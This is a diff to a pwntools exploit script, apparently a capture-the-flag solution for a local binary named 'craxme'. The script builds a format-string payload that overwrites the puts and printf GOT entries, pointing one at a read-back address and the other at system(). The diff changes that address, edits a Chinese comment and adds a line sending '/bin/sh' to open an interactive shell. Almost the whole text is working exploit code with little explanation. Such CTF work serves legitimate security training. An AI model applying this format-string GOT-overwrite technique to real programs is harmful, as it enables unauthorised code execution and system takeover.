@@ -12,8 +12,7 @@ p = process("./craxme")
 p.recvuntil("Give me magic :")
 
 
-# back2read = 0x080485ad
-back2read = 0x080485a1
+back2read = 0x0804859b
 system = 0x8048410
 printf_got = 0x0804a010
 puts_got = 0x0804a018
@@ -34,7 +33,7 @@ payload = flat([puts_got, puts_got+1, puts_got+2, puts_got+3])
 payload += flat([printf_got, printf_got+1, printf_got+2, printf_got+3])
 prev = 4*8
 
-for i in range(4): # range 等於欲填入 byte 次數
+for i in range(4): # range 等於欲填入 address 次數
     payload += fmt(prev, (back2read >> 8*i) & 0xff, 7+i) # 7 代表一開始寫入到 7$
     prev = (back2read >> 8*i) & 0xff
 for i in range(4):
@@ -42,6 +41,7 @@ for i in range(4):
     prev = (system >> i*8) & 0xff
 
 p.sendline(payload)
+p.sendline("/bin/sh") # system("/bin/sh")
 
 p.interactive()
 
